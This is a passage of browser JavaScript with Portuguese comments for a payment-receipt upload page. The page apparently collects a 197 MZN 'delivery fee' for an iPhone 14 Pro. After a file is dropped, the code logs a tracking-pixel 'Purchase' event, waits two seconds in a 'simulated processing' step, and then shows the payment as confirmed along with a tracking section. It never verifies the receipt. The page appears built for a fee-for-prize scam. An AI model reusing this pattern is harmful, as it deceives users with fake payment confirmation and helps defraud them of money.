  const dropArea = document.getElementById('drop-area');
  const filePreview = document.getElementById('file-preview');
  const fileName = document.getElementById('file-name');
  const fileSize = document.getElementById('file-size');
  
  // Impedir comportamento padrão de drag and drop no navegador
  ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
    dropArea.addEventListener(eventName, preventDefaults, false);
  });
  
  function preventDefaults(e) {
    e.preventDefault();
    e.stopPropagation();
  }


  // Destacar área quando arrastando arquivo
  ['dragenter', 'dragover'].forEach(eventName => {
    dropArea.addEventListener(eventName, highlight, false);
  });
  
  ['dragleave', 'drop'].forEach(eventName => {
    dropArea.addEventListener(eventName, unhighlight, false);
  });
  
  function highlight() {
    dropArea.style.borderColor = '#2196F3';
    dropArea.style.backgroundColor = '#e3f2fd';
  }
  
  function unhighlight() {
    dropArea.style.borderColor = '#ddd';
    dropArea.style.backgroundColor = 'white';
  }
  
  // Lidar com os arquivos soltos
  dropArea.addEventListener('drop', handleDrop, false);
  
  function handleDrop(e) {
    const dt = e.dataTransfer;
    const files = dt.files;
    handleFiles(files);
  }
  
  // Lidar com seleção de arquivo via input
  fileInput.addEventListener('change', function() {
    handleFiles(this.files);
  });
  
  function handleFiles(files) {
    if (files.length > 0) {
      const file = files[0];
      
      // Verificar tamanho (máx 5MB)
      if (file.size > 5 * 1024 * 1024) {
        alert('O arquivo é muito grande. O tamanho máximo permitido é 5MB.');
        return;
      }
      
      // Verificar tipo
      const acceptedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
      if (!acceptedTypes.includes(file.type)) {
        alert('Formato de arquivo não suportado. Por favor, envie um arquivo JPG, PNG ou PDF.');
        return;
      }
      
      // Exibir prévia
      fileName.textContent = file.name;
      fileSize.textContent = formatFileSize(file.size);
      filePreview.style.display = 'block';
      dropArea.style.display = 'none';
    }
  }
  
  function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    else if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    else return (bytes / 1048576).toFixed(1) + ' MB';
  }
}

// Remover arquivo
function removeFile() {
  const filePreview = document.getElementById('file-preview');
  const dropArea = document.getElementById('drop-area');
  const fileInput = document.getElementById('comprovativo-file');
  
  filePreview.style.display = 'none';
  dropArea.style.display = 'block';
  fileInput.value = ''; // Limpar o input
}

// Confirmar pagamento
function confirmarPagamento() {
  const filePreview = document.getElementById('file-preview');
  fbq('track', 'Purchase', {
    value: 197.00,
    currency: 'MZN',
    content_name: 'Taxa de Envio iPhone 14 Pro',
    content_ids: ['iphone14pro_delivery']
  });
  
  // Verificar se o arquivo foi enviado
  if (filePreview.style.display === 'none') {
    alert('Por favor, envie o comprovativo de pagamento antes de continuar.');
    return;
  }
  
  // Simular processamento
  const btnConfirmar = document.getElementById('btn-confirmar-pagamento');
  btnConfirmar.disabled = true;
  btnConfirmar.textContent = 'Processando...';
  btnConfirmar.style.backgroundColor = '#9e9e9e';
  
  setTimeout(() => {
    // Esconder seção pendente e mostrar confirmado
    document.getElementById('payment-status-pending').style.display = 'none';
    document.getElementById('payment-status-confirmed').style.display = 'flex';
    
    // Esconder seção de comprovativo
    document.getElementById('comprovativo-section').style.display = 'none';
    
    // Mostrar tracking
    document.getElementById('tracking-section').style.display = 'block';
    
    // Rolar para cima para mostrar a confirmação
    window.scrollTo({top: 0, behavior: 'smooth'});
  }, 2000);
}
// ⬇️ COLA AQUI EMBAIXO — FORA de qualquer função

window.copyToClipboard = function (text) {
  navigator.clipboard.writeText(text)
    .then(() => {
      alert('Copiado com sucesso! 🔥');
    })
    .catch(err => {
      alert('Erro ao copiar: ' + err);
    });
};
